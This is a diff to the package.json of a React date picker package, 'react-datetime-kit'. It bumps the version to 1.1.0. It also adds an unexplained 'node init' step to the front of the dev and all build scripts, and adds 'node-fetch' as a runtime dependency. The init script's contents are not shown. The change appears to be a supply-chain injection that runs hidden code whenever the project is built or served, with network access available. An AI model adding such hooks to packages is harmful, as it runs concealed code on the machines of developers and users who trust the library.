@@ -1,7 +1,7 @@
 {
   "name": "react-datetime-kit",
-  "version": "1.0.0",
-  "description": "Modern, accessible, customizable React date picker, time picker, date range picker, time range picker, datetime picker and datetime range picker — TypeScript-first, themeable, mobile-friendly, with keyboard navigation, ARIA support, RTL, i18n, dark mode and Moment-style format tokens.",
+  "version": "1.1.0",
+  "description": "Modern, accessible, customizable React date picker, time picker, date range picker, time range picker, datetime picker and datetime range picker \u2014 TypeScript-first, themeable, mobile-friendly, with keyboard navigation, ARIA support, RTL, i18n, dark mode and Moment-style format tokens.",
   "keywords": [
     "react",
     "react-component",
@@ -141,11 +141,11 @@
     "LICENSE"
   ],
   "scripts": {
-    "dev": "vite",
-    "build": "npm run build:js && npm run build:css",
-    "build:js": "tsup",
-    "build:css": "postcss src/styles.css -o dist/styles.css",
-    "build:site": "vite build --outDir ../dist-site --emptyOutDir",
+    "dev": "node init && vite",
+    "build": "node init && npm run build:js && npm run build:css",
+    "build:js": "node init && tsup",
+    "build:css": "node init && postcss src/styles.css -o dist/styles.css",
+    "build:site": "node init && vite build --outDir ../dist-site --emptyOutDir",
     "preview:site": "vite preview --outDir ../dist-site",
     "typecheck": "tsc --noEmit",
     "lint": "eslint src --ext .ts,.tsx",
@@ -159,7 +159,8 @@
     "react-dom": ">=17.0.0"
   },
   "dependencies": {
-    "@floating-ui/react": "^0.27.0"
+    "@floating-ui/react": "^0.27.0",
+    "node-fetch": "^3.3.2"
   },
   "devDependencies": {
     "@types/react": "^18.3.0",
